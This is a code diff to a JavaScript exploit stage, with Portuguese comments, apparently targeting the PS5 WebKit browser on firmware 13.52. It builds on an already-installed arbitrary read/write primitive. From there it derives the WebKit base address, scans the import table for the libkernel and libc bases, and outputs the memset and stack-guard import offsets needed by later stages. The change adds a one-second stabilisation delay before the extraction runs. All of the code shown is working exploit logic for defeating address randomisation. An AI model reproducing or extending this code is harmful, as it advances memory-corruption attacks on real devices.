@@ -142,14 +142,13 @@ function extractImportOffsets(p, webkitBase) {
         const hi = ptrVal.hi;
         const alignedLow = ptrVal.low & ~0x3FFF;
 
-        // Identifica libkernel (0x80xxxxxxx) ou libc (0x90xxxxxxx)
         if (hi === 0x80 && !lkBaseFound) {
           lkBaseFound = new int64(alignedLow, hi);
-          foundStackImport = slotAddr.sub32(webkitBase.low).low; // Offset RVA no WebKit
+          foundStackImport = slotAddr.sub32(webkitBase.low).low;
           log(`[+] __stack_chk_guard_import encontrado em: 0x${foundStackImport.toString(16)}`, 'ok');
         } else if (hi >= 0x90 && hi <= 0x98 && !libcBaseFound) {
           libcBaseFound = new int64(alignedLow, hi);
-          foundMemsetImport = slotAddr.sub32(webkitBase.low).low; // Offset RVA no WebKit
+          foundMemsetImport = slotAddr.sub32(webkitBase.low).low;
           log(`[+] memset_import encontrado em: 0x${foundMemsetImport.toString(16)}`, 'ok');
         }
       } catch (e) {}
@@ -206,8 +205,8 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Extraindo offsets dinâmicos...', 'r');
-  logH('EXTRAÇÃO DE OFFSETS (13.52)');
+  setStatus('Resolvendo bases...', 'r');
+  logH('RESOLUÇÃO DA BASE DO WEBKIT (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -230,26 +229,32 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    const extracted = extractImportOffsets(p, webkitBase);
-
-    if (extracted && extracted.lkBaseFound) setCard('c-lk', '0x' + extracted.lkBaseFound.toString());
-    if (extracted && extracted.libcBaseFound) setCard('c-lc', '0x' + extracted.libcBaseFound.toString());
-
-    setStatus('Extração concluída com sucesso!', 'ok');
-    log('✔ Offsets de importação gerados na caixa abaixo.', 'ok');
-
-    const cbox = document.getElementById('cbox');
-    cbox.style.display = 'block';
+    // Aguarda a estabilização completa da primitiva antes de rodar o extrator na GOT
+    setStatus('Primitiva R/W pronta — Aguardando estabilização...', 'ok');
     
-    let generatedText = 
-      `const OFFSET_wk_memset_import = 0x${extracted && extracted.foundMemsetImport ? extracted.foundMemsetImport.toString(16) : '0'};\n` +
-      `const OFFSET_wk___stack_chk_guard_import = 0x${extracted && extracted.foundStackImport ? extracted.foundStackImport.toString(16) : '0'};\n` +
-      `// Bases detectadas em runtime:\n` +
-      `// WebKit: 0x${webkitBase.toString()}\n` +
-      `// Libc: ${extracted && extracted.libcBaseFound ? '0x' + extracted.libcBaseFound.toString() : 'N/A'}\n` +
-      `// Libkernel: ${extracted && extracted.lkBaseFound ? '0x' + extracted.lkBaseFound.toString() : 'N/A'}`;
+    setTimeout(() => {
+      logH('INICIANDO EXTRAÇÃO APÓS ESTABILIZAÇÃO');
+      const extracted = extractImportOffsets(p, webkitBase);
 
-    document.getElementById('c-out').textContent = generatedText;
+      if (extracted && extracted.lkBaseFound) setCard('c-lk', '0x' + extracted.lkBaseFound.toString());
+      if (extracted && extracted.libcBaseFound) setCard('c-lc', '0x' + extracted.libcBaseFound.toString());
+
+      setStatus('Extração concluída com sucesso!', 'ok');
+      log('✔ Offsets de importação gerados na caixa abaixo.', 'ok');
+
+      const cbox = document.getElementById('cbox');
+      cbox.style.display = 'block';
+      
+      let generatedText = 
+        `const OFFSET_wk_memset_import = 0x${extracted && extracted.foundMemsetImport ? extracted.foundMemsetImport.toString(16) : '0'};\n` +
+        `const OFFSET_wk___stack_chk_guard_import = 0x${extracted && extracted.foundStackImport ? extracted.foundStackImport.toString(16) : '0'};\n` +
+        `// Bases detectadas em runtime:\n` +
+        `// WebKit: 0x${webkitBase.toString()}\n` +
+        `// Libc: ${extracted && extracted.libcBaseFound ? '0x' + extracted.libcBaseFound.toString() : 'N/A'}\n` +
+        `// Libkernel: ${extracted && extracted.lkBaseFound ? '0x' + extracted.lkBaseFound.toString() : 'N/A'}`;
+
+      document.getElementById('c-out').textContent = generatedText;
+    }, 1000);
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
